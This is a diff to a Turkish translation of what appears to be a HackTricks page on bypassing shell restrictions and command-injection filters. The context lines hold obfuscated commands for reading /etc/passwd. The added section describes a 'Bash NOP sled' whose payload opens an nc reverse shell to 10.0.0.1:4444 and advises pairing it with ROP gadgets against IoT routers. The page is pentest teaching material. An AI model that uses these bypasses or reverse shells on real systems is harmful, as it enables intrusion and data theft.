@@ -114,7 +114,7 @@ cat $(echo . | tr '!-0' '"-1')etc$(echo . | tr '!-0' '"-1')passwd
 ```bash
 bash<<<$(base64 -d<<<Y2F0IC9ldGMvcGFzc3dkIHwgZ3JlcCAzMw==)
 ```
-### Hex kodlaması ile atlatma
+### Hex kodlama ile atlatma
 ```bash
 echo -e "\x2f\x65\x74\x63\x2f\x70\x61\x73\x73\x77\x64"
 cat `echo -e "\x2f\x65\x74\x63\x2f\x70\x61\x73\x73\x77\x64"`
@@ -133,7 +133,7 @@ cat `xxd -r -ps <(echo 2f6574632f706173737764)`
 ```bash
 time if [ $(whoami|cut -c 1) == s ]; then sleep 5; fi
 ```
-### Çevre Değişkenlerinden Karakter Alma
+### Ortam Değişkenlerinden Karakter Alma
 ```bash
 echo ${LS_COLORS:10:1} #;
 echo ${PATH:0:1} #/
@@ -145,7 +145,7 @@ echo ${PATH:0:1} #/
 ### Yerleşik Komutlar
 
 Dış fonksiyonları çalıştıramıyorsanız ve yalnızca RCE elde etmek için **sınırlı bir yerleşik komut setine** erişiminiz varsa, bunu yapmanın bazı pratik yolları vardır. Genellikle **tüm** **yerleşik komutları** kullanamayacaksınız, bu yüzden hapisten kurtulmak için **tüm seçeneklerinizi bilmelisiniz**. Fikir [**devploit**](https://twitter.com/devploit)'ten.\
-Öncelikle tüm [**shell yerleşik komutlarını**](https://www.gnu.org/software/bash/manual/html_node/Shell-Builtin-Commands.html)** kontrol edin.** İşte bazı **öneriler**:
+Öncelikle tüm [**shell yerleşik komutlarını**](https://www.gnu.org/software/bash/manual/html_node/Shell-Builtin-Commands.html)** kontrol edin.** Ardından burada bazı **öneriler** var:
 ```bash
 # Get list of builtins
 declare builtins
@@ -294,25 +294,47 @@ ln /f*
 'sh x'
 'sh g'
 ```
-## Sadece Okuma/Noexec/Distroless Bypass
+## Salt-Okuma/Noexec/Distroless Bypass
 
-Eğer **sadece okuma ve noexec korumalarına** sahip bir dosya sistemindeyseniz veya hatta distroless bir konteynerdeyseniz, yine de **rastgele ikili dosyaları çalıştırmanın yolları vardır, hatta bir shell!:**
+Eğer **salt-okuma ve noexec korumalarına** sahip bir dosya sistemindeyseniz veya hatta distroless bir konteynerdeyseniz, yine de **rastgele ikili dosyaları çalıştırmanın yolları vardır, hatta bir shell!:**
 
 {{#ref}}
 bypass-fs-protections-read-only-no-exec-distroless/
 {{#endref}}
 
-## Chroot & Diğer Jailer Bypass
+## Chroot & diğer Jailer Bypass
 
 {{#ref}}
 ../privilege-escalation/escaping-from-limited-bash.md
 {{#endref}}
 
-## Referanslar & Daha Fazlası
+## Uzay Tabanlı Bash NOP Sled ("Bashsledding")
+
+Bir zafiyet, nihayetinde `system()` veya başka bir shell'e ulaşan bir argümanı kısmen kontrol etmenize izin veriyorsa, yüklemenizin okunmaya başlandığı tam offset'i bilmeyebilirsiniz. Geleneksel NOP sled'leri (örneğin `\x90`) shell sözdiziminde **çalışmaz**, ancak Bash, bir komutu çalıştırmadan önceki boşlukları zararsız bir şekilde göz ardı eder.
+
+Bu nedenle, gerçek komutunuzu uzun bir boşluk veya sekme karakteri dizisi ile ön ekleyerek *Bash için bir NOP sled* oluşturabilirsiniz:
+```bash
+# Payload sprayed into an environment variable / NVRAM entry
+"                nc -e /bin/sh 10.0.0.1 4444"
+# 16× spaces ───┘ ↑ real command
+```
+Eğer bir ROP zinciri (veya herhangi bir bellek bozulma primi) talimat işaretçisini alan bloğu içinde bir yere yerleştirirse, Bash ayrıştırıcısı boşlukları atlayarak `nc`'ye ulaşır ve komutunuzu güvenilir bir şekilde çalıştırır.
+
+Pratik kullanım durumları:
+
+1. **Bellek haritalı yapılandırma blob'ları** (örneğin NVRAM) süreçler arasında erişilebilir.
+2. Saldırganın yükü hizalamak için NULL baytları yazamadığı durumlar.
+3. Sadece BusyBox `ash`/`sh`'nin mevcut olduğu gömülü cihazlar – bunlar da öncelikli boşlukları yok sayar.
+
+> 🛠️  Bu numarayı `system()` çağıran ROP gadget'ları ile birleştirerek bellek kısıtlı IoT yönlendiricilerinde istismar güvenilirliğini önemli ölçüde artırın.
+
+## Referanslar ve Daha Fazlası
 
 - [https://github.com/swisskyrepo/PayloadsAllTheThings/tree/master/Command%20Injection#exploits](https://github.com/swisskyrepo/PayloadsAllTheThings/tree/master/Command%20Injection#exploits)
 - [https://github.com/Bo0oM/WAF-bypass-Cheat-Sheet](https://github.com/Bo0oM/WAF-bypass-Cheat-Sheet)
 - [https://medium.com/secjuice/web-application-firewall-waf-evasion-techniques-2-125995f3e7b0](https://medium.com/secjuice/web-application-firewall-waf-evasion-techniques-2-125995f3e7b0)
-- [https://www.secjuice.com/web-application-firewall-waf-evasion/](https://www.secju
+- [https://www.secjuice.com/web-application-firewall-waf-evasion/](https://www.secjuice.com/web-application-firewall-waf-evasion/)
+
+- [Terkedilmiş donanımlarda sıfır günleri istismar etmek – Trail of Bits blog](https://blog.trailofbits.com/2025/07/25/exploiting-zero-days-in-abandoned-hardware/)
 
 {{#include ../../banners/hacktricks-training.md}}
